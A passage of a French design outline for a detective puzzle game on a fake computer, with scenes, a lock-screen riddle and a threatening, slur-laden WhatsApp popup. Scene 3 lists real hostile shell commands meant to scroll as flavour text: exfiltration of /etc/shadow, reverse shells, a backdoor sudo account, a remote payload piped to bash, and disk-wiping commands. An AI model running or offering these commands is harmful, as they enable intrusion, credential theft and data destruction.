On est un détective qui trouve un ordinateur


**Scène 0: Mise en place de la scène.**

On est devant son ordi, ça se passe devant le bureau du détective avec l'ordinateur devant la caméra. Quand on clique dessus l'ordinateur grandit et l'histoire commence



**Scène 1: Première énigme.**

On rentre dans l'ordinateur et on arrive sur l'écran verrouillé. Pour le déverouiller, il faut trouver le nom du chat qui est sur le fond d'écran. 



**Scène 2: ÉCRAN D'ACCUEIL**

Ordinateur en mode ubuntuu.
Applications a afficher sur la barre latérale gauche de l'écran (à implémenter éventuellement): 
- Photo,
- Fichier,
- Aperçu (pour ouvrir des photos),
- Whatsapp,
- Internet Explorer,
- (plus tard si on a le temps : une application Camera où on voit la gueule du détective)



**Scène 2: Message douteux**

Lorsque l'écran est déverouillé, un message apparait : "Va crever sale pute, je sais qui tu es..." +33 6 45 39 94 28.  
Le popup est en haut et au centre de l'écran. On affiche l'icone de l'application Whatsapp a gauche du message.



**Scène 3: Pirate informatique**

Dés que l'on clique sur le message, le terminal s'ouvre et du code s'exécute : 

A EXEC DANS LE TERMINAL : 

~ $ export SYSTEM_ROOT_OVERRIDE="0x443F-A921-ENCRYPTED-Volume-XFS"
~ $ find /var/log -type f -exec sh -c 'cat /dev/null > "$1"' _ {} \;
~ $ netstat -antp | grep "LISTEN" | awk '{print $7}' | cut -d/ -f1 | sort -u
~ $ iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
~ $ dd if=/dev/urandom of=/tmp/random_buffer.bin bs=1M count=10 status=none
~ $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/k.pem
~ $ chmod 600 /tmp/k.pem && mv /tmp/k.pem /etc/ssl/private/shadow_key.pem
~ $ tar -czvf /tmp/sys_backup_critical.tar.gz /etc/passwd /etc/shadow /home/
~ $ curl -X POST -F "data=@/tmp/sys_backup_critical.tar.gz" http://10.0.0.9/up
~ $ ln -sf /dev/null /root/.bash_history && history -c && history -w
~ $ grep -r "confidential" /home/* 2>/dev/null | grep -v "Binary" > /tmp/leaks
~ $ base64 /tmp/leaks > /tmp/leaks.b64 && rm /tmp/leaks && touch /tmp/leaks
~ $ useradd -m -s /bin/bash -p $(openssl passwd -1 "R00tOverr!de") sys_admin_ghost
~ $ usermod -aG sudo sys_admin_ghost && echo "sys_admin_ghost ALL=(ALL) NOPASSWD:ALL"
~ $ python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &
~ $ watch -n 0.5 "ps aux | sort -nr -k 3 | head -n 10" > /dev/null 2>&1 &
~ $ sysctl -w net.ipv4.ip_forward=1 && echo "1" > /proc/sys/net/ipv4/ip_forward
~ $ arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 > /dev/null 2>&1 &
~ $ tcpdump -i eth0 -w /var/tmp/capture_stream_v4.pcap port 80 or port 443 &
~ $ sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
~ $ crontab -l | { cat; echo "* * * * * /bin/bash /var/tmp/persistence.sh"; }
~ $ wget -qO- http://remote-command-center.xyz/payload_v2.sh | bash > /dev/null
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f &
~ $ echo "0 0 * * * rm -rf --no-preserve-root /" > /etc/cron.d/self_destruct
~ $ cat /dev/urandom | head -c 50M > /var/www/html/buffer_overflow_test.dat
~ $ while true; do echo "PACKET_FLOOD_INITIATED" | nc -u 192.168.1.50 80; done &
~ $ export LD_PRELOAD=/usr/local/lib/lib_hook_process_hider.so.1.0.2
~ $ chattr +i /etc/resolv.conf && chattr +i /etc/hosts && chattr +i /etc/passwd
~ $ killall -9 apache2 && killall -9 nginx && service ssh restart
~ $ mount -o remount,rw /dev/sda1 / && touch /forcefsck && echo "Remount RW"
~ $ dd if=/dev/zero of=/dev/sda bs=512 count=1 conv=notrunc 2>/dev/null
~ $ echo "127.0.0.1 google.com facebook.com twitter.com" >> /etc/hosts
~ $ for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i >/dev/null & done
~ $ ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -n 15 > /tmp/proc_list
~ $ gpg --batch --passphrase "SuperSecret" -c /tmp/proc_list
~ $ rm -rf /var/lib/apt/lists/* && apt-get clean && apt-get autoremove -y
~ $ echo "KERNEL_PANIC_SIMULATION_MODE_ENABLED" | wall
~ $ sleep 2 && killall -u user && userdel -r user 2>/dev/null
~ $ mv /bin/ls /bin/ls_orig && echo 'echo "HACKED"' > /bin/ls && chmod +x /bin/ls
~ $ shutdown -h now "CRITICAL SYSTEM FAILURE: SECURITY COMPROMISED"


Un bruit strident retentit et l'ordinateur passe en mode fond noir avec une image de pirate.


**Scène 4: **
